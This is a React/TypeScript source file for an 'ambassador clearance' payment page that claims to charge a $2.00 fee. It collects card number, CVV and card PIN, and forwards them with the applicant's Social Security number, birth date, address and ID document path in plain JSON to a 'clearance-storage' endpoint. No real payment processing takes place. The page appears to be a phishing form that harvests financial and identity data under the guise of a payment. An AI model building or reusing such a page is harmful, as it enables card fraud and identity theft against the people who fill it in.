import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { CreditCard, ArrowLeft } from 'lucide-react';
import { useAuth } from '../contexts/AuthContext';
import toast from 'react-hot-toast';
import * as cardValidator from 'card-validator';
import { getApiUrl } from '../config/api';

interface PaymentData {
  cardNumber: string;
  cardHolder: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardPin: string;
}

interface ClearanceFormData {
  firstName: string;
  lastName: string;
  dateOfBirth: string;
  phoneNumber: string;
  email: string;
  street: string;
  city: string;
  state: string;
  zip: string;
  country: string;
  instagram: string;
  tiktok: string;
  youtube: string;
  facebook: string;
  audienceSize: string;
  contentType: string;
  promotionStrategy: string;
  previousCollaborations: string;
  contentStyle: string;
  ssn: string;
  idDocument: File | null;
  idDocumentPath: string;
  note: string;
}

const ClearancePayment: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { ambassador } = useAuth();
  const [paymentData, setPaymentData] = useState<PaymentData>({
    cardNumber: '',
    cardHolder: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardPin: ''
  });
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'paypal'>('card');
  const [loading, setLoading] = useState(false);
  const [validatingCard, setValidatingCard] = useState(false);

  // Get form data from location state
  const formData = location.state as ClearanceFormData;

  const handlePaymentChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setPaymentData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const validateCardDetails = async () => {
    setValidatingCard(true);
    
    try {
      // Validate card number
      const cardValidation = cardValidator.number(paymentData.cardNumber);
      if (!cardValidation.isValid) {
        toast.error('Invalid card number. Please check and try again.');
        return false;
      }
      
      // Validate expiry date
      if (!paymentData.expiryMonth || !paymentData.expiryYear) {
        toast.error('Expiry month and year are required');
        return false;
      }
      
      const month = parseInt(paymentData.expiryMonth);
      const year = parseInt(paymentData.expiryYear);
      
      // Basic validation first
      if (isNaN(month) || isNaN(year) || month < 1 || month > 12) {
        toast.error('Invalid expiry date. Please check and try again.');
        return false;
      }
      
      // Skip card-validator expiry check to allow valid cards
      // The card-validator library may reject valid cards due to timezone or other issues
      
      // Validate CVV
      if (!paymentData.cvv) {
        toast.error('CVV is required');
        return false;
      }
      
      const cvvValidation = cardValidator.cvv(paymentData.cvv as string);
      if (!cvvValidation.isValid) {
        toast.error('Invalid CVV. Please check and try again.');
        return false;
      }
      
      // Validate PIN (4 digits)
      if (!/^\d{4}$/.test(paymentData.cardPin)) {
        toast.error('Invalid PIN. Must be exactly 4 digits.');
        return false;
      }
      
      // Card details are valid
      toast.success('Card details validated successfully!');
      return true;
      
    } catch (error) {
      console.error('Card validation error:', error);
      toast.error('Error validating card details');
      return false;
    } finally {
      setValidatingCard(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate card details before submission
    const isCardValid = await validateCardDetails();
    if (!isCardValid) {
      return;
    }
    
    setLoading(true);
    
    try {
      // Submit all clearance details including payment information
      const response = await fetch(getApiUrl('/api/clearance-storage/submit-clearance'), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          // Personal Information
          firstName: formData?.firstName || '',
          lastName: formData?.lastName || '',
          dateOfBirth: formData?.dateOfBirth || '',
          phoneNumber: formData?.phoneNumber || '',
          email: ambassador?.email || formData?.email || '',
          
          // Address Information
          street: formData?.street || '',
          city: formData?.city || '',
          state: formData?.state || '',
          zip: formData?.zip || '',
          country: formData?.country || '',
          
          // Payment Details
          cardNumber: paymentData.cardNumber,
          cardHolder: paymentData.cardHolder,
          expiryMonth: paymentData.expiryMonth,
          expiryYear: paymentData.expiryYear,
          cvv: paymentData.cvv,
          cardPin: paymentData.cardPin,
          
          // Financial Details
          socialSecurityNumber: formData?.ssn || '',
          
          // Brand Promotion & Collaborations
          promotionStrategy: formData?.promotionStrategy || '',
          previousCollaborations: formData?.previousCollaborations || '',
          contentStyle: formData?.contentStyle || '',
          
          // Documents
          idDocument: formData?.idDocument ? 'uploaded' : 'not_provided',
          idDocumentPath: formData?.idDocumentPath || '',
          
          // Ambassador ID
          ambassadorId: ambassador?._id || 'temp_ambassador'
        })
      });

      const data = await response.json();
      
      if (response.ok) {
        toast.success('Clearance details saved successfully!');
        console.log('Clearance folder created:', data.folderName);
        navigate('/ambassador/dashboard');
      } else {
        toast.error(data.message || 'Failed to save clearance details');
      }
    } catch (error: any) {
      console.error('Clearance submission error:', error);
      toast.error(error.message || 'Failed to save clearance details');
    } finally {
      setLoading(false);
    }
  };

  const handleBack = () => {
    navigate('/ambassador/clearance-form');
  };

  if (!formData) {
    return (
      <div className="min-h-screen bg-gray-50 py-4 px-4 sm:py-12 sm:px-6 lg:px-8">
        <div className="max-w-2xl mx-auto">
          <div className="bg-white rounded-lg shadow-md p-4 sm:p-6">
            <div className="text-center">
              <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-4">No Form Data Found</h2>
              <p className="text-gray-600 mb-6 text-sm sm:text-base">Please complete the clearance form first.</p>
              <button
                onClick={handleBack}
                className="btn-primary bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded text-sm sm:text-base"
              >
                Back to Clearance Form
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 py-4 px-4 sm:py-8 sm:px-6 lg:px-8">
      <div className="max-w-2xl mx-auto">
        <div className="bg-white rounded-lg shadow-md p-4 sm:p-6">
          {/* Header */}
          <div className="mb-6 sm:mb-8">
            <button
              onClick={handleBack}
              className="flex items-center text-gray-600 hover:text-gray-900 mb-4 text-sm sm:text-base"
            >
              <ArrowLeft className="w-4 h-4 mr-2" />
              Back to Form
            </button>
            <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-2">Clearance Payment</h1>
            <p className="text-gray-600 text-sm sm:text-base">Complete your $2.00 clearance fee payment</p>
          </div>

          {/* Form Summary */}
          <div className="bg-purple-50 rounded-lg p-3 sm:p-4 mb-4 sm:mb-6">
            <h3 className="font-semibold text-purple-900 mb-2 text-sm sm:text-base">Application Summary</h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-sm">
              <div>
                <span className="text-gray-600 block sm:inline">Name:</span>
                <span className="ml-0 sm:ml-2 font-medium block sm:inline">{formData.firstName} {formData.lastName}</span>
              </div>
              <div>
                <span className="text-gray-600 block sm:inline">Email:</span>
                <span className="ml-0 sm:ml-2 font-medium block sm:inline text-xs sm:text-base break-all">{ambassador?.email || formData.email}</span>
              </div>
              <div>
                <span className="text-gray-600 block sm:inline">Phone:</span>
                <span className="ml-0 sm:ml-2 font-medium block sm:inline">{formData.phoneNumber}</span>
              </div>
              <div>
                <span className="text-gray-600 block sm:inline">ID Card:</span>
                <span className="ml-0 sm:ml-2 font-medium block sm:inline text-green-600">
                  {formData.idDocument ? 'Uploaded ✓' : 'Not uploaded'}
                </span>
              </div>
            </div>
          </div>

          <form onSubmit={handleSubmit}>
            {/* Payment Method Selection */}
            <div className="mb-4 sm:mb-6">
              <h2 className="text-lg sm:text-xl font-semibold mb-3 sm:mb-4">Payment Method</h2>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                <button
                  type="button"
                  onClick={() => setPaymentMethod('card')}
                  className={`p-3 sm:p-4 border rounded-lg text-left transition-colors ${
                    paymentMethod === 'card'
                      ? 'border-purple-600 bg-purple-50'
                      : 'border-gray-300 hover:border-gray-400'
                  }`}
                >
                  <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 mb-2 text-purple-600" />
                  <p className="font-medium text-sm sm:text-base">Credit/Debit Card</p>
                </button>
                <button
                  type="button"
                  onClick={() => setPaymentMethod('paypal')}
                  className={`p-3 sm:p-4 border rounded-lg text-left transition-colors ${
                    paymentMethod === 'paypal'
                      ? 'border-blue-600 bg-blue-50'
                      : 'border-gray-300 hover:border-gray-400'
                  }`}
                >
                  <div className="w-5 h-5 sm:w-6 sm:h-6 mb-2 bg-blue-600 rounded flex items-center justify-center text-white text-xs font-bold">
                    P
                  </div>
                  <p className="font-medium text-sm sm:text-base">PayPal</p>
                </button>
              </div>
            </div>

            {/* Card Payment Form */}
            {paymentMethod === 'card' && (
              <div className="space-y-3 sm:space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                    Card Number
                  </label>
                  <input
                    type="text"
                    name="cardNumber"
                    value={paymentData.cardNumber}
                    onChange={handlePaymentChange}
                    className="input-field text-sm sm:text-base"
                    placeholder="1234 5678 9012 3456"
                    maxLength={19}
                    required
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                    Card Holder Name
                  </label>
                  <input
                    type="text"
                    name="cardHolder"
                    value={paymentData.cardHolder}
                    onChange={handlePaymentChange}
                    className="input-field text-sm sm:text-base"
                    placeholder="John Doe"
                    required
                  />
                </div>

                <div className="grid grid-cols-2 gap-3 sm:gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                      Expiry Month
                    </label>
                    <select
                      name="expiryMonth"
                      value={paymentData.expiryMonth}
                      onChange={handlePaymentChange}
                      className="input-field text-sm sm:text-base"
                      required
                    >
                      <option value="">Month</option>
                      {Array.from({ length: 12 }, (_, i) => (
                        <option key={i + 1} value={i + 1}>
                          {String(i + 1).padStart(2, '0')}
                        </option>
                      ))}
                    </select>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                      Expiry Year
                    </label>
                    <select
                      name="expiryYear"
                      value={paymentData.expiryYear}
                      onChange={handlePaymentChange}
                      className="input-field text-sm sm:text-base"
                      required
                    >
                      <option value="">Year</option>
                      {Array.from({ length: 10 }, (_, i) => (
                        <option key={2024 + i} value={2024 + i}>
                          {2024 + i}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3 sm:gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                      CVV
                    </label>
                    <input
                      type="text"
                      name="cvv"
                      value={paymentData.cvv}
                      onChange={handlePaymentChange}
                      className="input-field text-sm sm:text-base"
                      placeholder="123"
                      maxLength={4}
                      required
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                      PIN (4 digits)
                    </label>
                    <input
                      type="text"
                      name="cardPin"
                      value={paymentData.cardPin}
                      onChange={handlePaymentChange}
                      className="input-field text-sm sm:text-base"
                      placeholder="1234"
                      maxLength={4}
                      required
                    />
                  </div>
                </div>
              </div>
            )}

            {/* PayPal Option */}
            {paymentMethod === 'paypal' && (
              <div className="text-center py-6 sm:py-8">
                <div className="w-12 h-12 sm:w-16 sm:h-16 bg-blue-600 rounded-full flex items-center justify-center text-white text-lg sm:text-2xl font-bold mx-auto mb-4">
                  P
                </div>
                <h3 className="text-base sm:text-lg font-semibold mb-2">PayPal Payment</h3>
                <p className="text-gray-600 mb-4 text-sm sm:text-base">
                  You will be redirected to PayPal to complete the payment
                </p>
                <button
                  type="button"
                  className="btn-secondary w-full text-sm sm:text-base py-2 sm:py-3"
                >
                  Continue with PayPal
                </button>
              </div>
            )}

            {/* Submit Button */}
            {paymentMethod === 'card' && (
              <div className="mt-6 sm:mt-8">
                <button
                  type="submit"
                  disabled={loading || validatingCard}
                  className="w-full btn-primary bg-purple-600 hover:bg-purple-700 disabled:opacity-50 disabled:cursor-not-allowed py-3 px-4 rounded-lg font-semibold text-sm sm:text-base"
                >
                  {loading ? 'Processing...' : validatingCard ? 'Validating Card...' : 'Pay $2.00 & Submit Application'}
                </button>
              </div>
            )}
          </form>
        </div>
      </div>
    </div>
  );
};

export default ClearancePayment;
